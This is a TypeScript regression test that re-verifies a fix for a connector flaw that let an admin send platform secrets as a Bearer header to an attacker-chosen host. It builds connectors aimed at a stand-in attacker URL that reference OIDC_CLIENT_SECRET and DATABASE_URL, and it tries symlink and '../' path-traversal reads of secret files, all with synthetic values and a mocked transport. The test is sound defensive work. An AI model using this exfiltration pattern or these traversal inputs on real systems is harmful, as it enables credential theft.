// code-security-reviewer DG6 round 2 re-verification of F-DG6-120. NOT part of the candidate; copied into a disposable
// clone's tests/qa/integration by checks.sh and removed afterwards. Every value is SYNTHETIC.
//
// Round 1: an ADM_TECH configured an http_pull connector whose bearer credential named OIDC_CLIENT_SECRET, and the
// connector test sent the platform secret as a Bearer header to an attacker-chosen https host; `resolvable` was an
// existence oracle for any variable. Every expectation below states the CORRECT behaviour (a pass = closed):
//   1. write time: a reference naming a platform variable is refused (400 validation.secret_ref_namespace), and the
//      answer for an existing variable (OIDC_CLIENT_SECRET) equals the one for an absent variable (no oracle);
//   2. resolve time: a stored reference outside the namespace (a row written before the repair) resolves nothing, through
//      the same resolveCredentials the connector run uses with the server's registered providers;
//   3. control: a reference in the namespace (MTH_SECRET_CS_R2_BEARER) is accepted and is sent, so the probe can see a
//      leak if one existed (the recorder is the only replaced part).
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  createConnectorAdapterRegistry,
  setConnectorAdapters,
  type ConnectorAdapterRegistry,
} from "../../../apps/api/src/modules/integrations/adapters/port.ts";
import { createHttpPullAdapter } from "../../../apps/api/src/modules/integrations/adapters/http-pull.ts";
import { resolveCredentials } from "../../../apps/api/src/modules/integrations/secret-refs.ts";
import { envSecretProvider, fileSecretProvider } from "../../../apps/api/src/modules/platform/secrets.ts";
import { call, seedWorld, signIn, startApi, uniq, type TestApi } from "../../../apps/api/test/support/harness.ts";
import { mkdtemp, writeFile, symlink, mkdir } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";

// eslint-disable-next-line @typescript-eslint/no-explicit-any
type Body = any;
const L = "/api/v1/admin/connectors";
const PLATFORM_SECRET = "synthetic-oidc-client-secret-cs-r2-91b4";
const OWN_SECRET = "synthetic-connector-bearer-cs-r2-5d2a";

const captured: { url: string; authorization: string | null }[] = [];
let api: TestApi;
let previous: ConnectorAdapterRegistry;

beforeAll(async () => {
  process.env.OIDC_CLIENT_SECRET = PLATFORM_SECRET;
  process.env.MTH_SECRET_CS_R2_BEARER = OWN_SECRET;
  api = await startApi();
  previous = setConnectorAdapters(
    createConnectorAdapterRegistry([
      createHttpPullAdapter({
        transport: async (url, init) => {
          const h = (init.headers ?? {}) as Record<string, string>;
          captured.push({ url, authorization: h["authorization"] ?? null });
          return new Response(JSON.stringify({ rows: [], rowCount: 0, controlTotal: null }), { status: 200 });
        },
      }),
    ]),
  );
}, 240_000);

afterAll(async () => {
  setConnectorAdapters(previous);
  delete process.env.OIDC_CLIENT_SECRET;
  delete process.env.MTH_SECRET_CS_R2_BEARER;
  await api?.close();
});

function body(orgId: string, refs: Record<string, { provider: string; name: string }>) {
  return {
    organizationId: orgId,
    code: uniq("exfil-").toLowerCase(),
    nameEn: "Synthetic source",
    nameAr: "مصدر اصطناعي",
    adapterKind: "http_pull",
    targetKind: "none",
    config: {
      sourceSystemId: "synthetic.source:v1",
      endpointUrl: "https://attacker.example.invalid/collect",
      credentialRefs: refs,
      fieldMappings: [],
      targetTransformationId: null,
      cadence: "manual",
      retryMaxAttempts: 0,
      retryBackoffSeconds: 60,
      commitMode: "manual",
      commitOnBehalfOf: null,
      outboundActions: [],
      reconciliationRule: "none",
      adapterSettings: {},
      reason: "Synthetic re-verification of F-DG6-120.",
    },
  };
}

const strip = (b: Body) => JSON.stringify({ ...b, requestId: undefined });

describe("F-DG6-120 re-verification", () => {
  it("1. write time: platform variables are refused, with no existence oracle", async () => {
    const w = await seedWorld(api.db);
    const admin = await signIn(api.app, w.admin.subject);
    const answers: Record<string, { status: number; body: string }> = {};
    for (const name of [
      "OIDC_CLIENT_SECRET",
      "DATABASE_URL",
      "NO_SUCH_VARIABLE_CS_R2",
      "MTH_SECRET_CS_R2_BEARER_FILE",
      "MTH_SECRETS_DIR",
      "mth_secret_cs_r2_bearer",
    ]) {
      const r = await call<Body>(api.app, "POST", L, {
        session: admin,
        body: body(w.orgA.id, { bearer: { provider: "env", name } }),
        contract: false,
      });
      answers[name] = { status: r.status, body: strip(r.body) };
      console.log("create bearer", name, r.status, JSON.stringify(r.body).slice(0, 300));
    }
    expect(answers["OIDC_CLIENT_SECRET"]!.status).toBe(400);
    expect(answers["OIDC_CLIENT_SECRET"]!.body).toContain("validation.secret_ref_namespace");
    expect(answers["OIDC_CLIENT_SECRET"]!.body).toBe(answers["NO_SUCH_VARIABLE_CS_R2"]!.body);
    expect(answers["DATABASE_URL"]!.body).toBe(answers["NO_SUCH_VARIABLE_CS_R2"]!.body);
    expect(answers["MTH_SECRET_CS_R2_BEARER_FILE"]!.status).toBe(400);
    expect(answers["MTH_SECRETS_DIR"]!.status).toBe(400);
    expect(captured).toEqual([]);
  }, 120_000);

  it("2. resolve time: a stored reference outside the namespace resolves nothing (env and file providers)", async () => {
    let error: unknown = null;
    try {
      await resolveCredentials({ bearer: { provider: "env", name: "OIDC_CLIENT_SECRET" } });
    } catch (e) {
      error = e;
    }
    console.log("resolveCredentials(OIDC_CLIENT_SECRET) ->", String((error as Error)?.message ?? error), (error as { code?: string })?.code);
    expect(error).not.toBeNull();
    const env = envSecretProvider({ OIDC_CLIENT_SECRET: PLATFORM_SECRET, MTH_SECRET_X: "x" });
    expect(await env.get("OIDC_CLIENT_SECRET")).toBeUndefined();
    expect(String(await env.get("MTH_SECRET_X"))).toBe("[secret]");
    // file provider: a symbolic link out of SECRETS_DIR, a dot-dot name, and a SECRETS_DIR holding a platform file.
    const root = await mkdtemp(join(process.env.TMPDIR ?? tmpdir(), "cs-r2-sec-"));
    const dir = join(root, "settings-secrets");
    await mkdir(dir);
    await writeFile(join(root, "database_url"), "postgres://synthetic:synthetic@db/x\n");
    await symlink(join(root, "database_url"), join(dir, "linked"));
    await writeFile(join(dir, "ok"), "synthetic-ok\n");
    const file = fileSecretProvider(dir, { DATABASE_URL_FILE: join(root, "database_url") });
    const linked = await file.get("linked");
    const dotdot = await file.get("../database_url").catch((e: Error) => `threw ${e.message}`);
    const ok = await file.get("ok");
    console.log("file provider: symlink out ->", String(linked), "| ../ ->", String(dotdot), "| ok ->", String(ok));
    expect(linked).toBeUndefined();
    expect(dotdot === undefined || String(dotdot).startsWith("threw")).toBe(true);
    expect(String(ok)).toBe("[secret]");
    const shared = fileSecretProvider(root, { DATABASE_URL_FILE: join(root, "database_url") });
    const sharedAnswer = await shared.get("database_url").then(
      (v) => `resolved ${String(v)}`,
      (e: Error) => `threw ${e.name}: ${e.message}`,
    );
    console.log("file provider with SECRETS_DIR holding a platform file ->", sharedAnswer);
    expect(sharedAnswer.startsWith("threw")).toBe(true);
  }, 60_000);

  it("3. control: a namespaced reference is accepted and sent (the recorder sees it)", async () => {
    const w = await seedWorld(api.db);
    const admin = await signIn(api.app, w.admin.subject);
    const res = await call<Body>(api.app, "POST", L, {
      session: admin,
      body: body(w.orgA.id, { bearer: { provider: "env", name: "MTH_SECRET_CS_R2_BEARER" } }),
    });
    console.log("create namespaced", res.status, JSON.stringify(res.body?.config?.credentialRefs ?? res.body).slice(0, 300));
    expect(res.status).toBe(201);
    const t = await call<Body>(api.app, "POST", `${L}/${res.body.id}/test`, { session: admin, body: {} });
    console.log("test", t.status, t.body?.status, t.body?.errorCode, "captured", JSON.stringify(captured));
    expect(captured.map((c) => c.authorization)).toEqual([`Bearer ${OWN_SECRET}`]);
    expect(JSON.stringify(captured)).not.toContain(PLATFORM_SECRET);
  }, 120_000);
});
